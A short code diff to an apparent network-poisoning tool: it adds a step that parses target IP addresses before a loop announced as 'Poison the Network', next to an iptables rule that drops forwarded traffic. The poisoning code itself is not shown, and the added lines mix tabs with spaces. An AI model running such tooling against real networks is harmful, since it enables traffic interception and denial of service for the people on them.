@@ -76,6 +76,9 @@ def proxier(ap_ip, interface):
         print("Blocking entire forwarded traffic...")
         os.system(f"iptables -A FORWARD -o {interface} -j DROP")
         print(GREEN + "Done!" + NONE)
+	print("Parsing available IP adresses...")
+	ip_parser(ap_ip)
+	print(GREEN + "Done!" + NONE)
         print("Starting to Poison the Network...")
         while 1 < 2:
             for target_ip in ip_list:
